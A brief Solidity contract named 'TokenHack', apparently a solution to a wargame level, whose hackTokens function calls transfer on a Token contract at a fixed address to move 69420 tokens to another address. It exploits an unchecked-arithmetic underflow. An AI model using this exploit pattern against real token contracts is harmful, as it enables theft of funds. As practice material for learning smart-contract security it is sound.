// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Token.sol';

contract TokenHack {

  address public owner;
  Token  token = Token(address(0xaA65eA7714981eFD60Ec081ecb4C8440426366D1));



  function hackTokens() public {
      token.transfer(address(0xeB015B841913E996c47960fE32968BD9c4e83C7d), 69420);
  }
}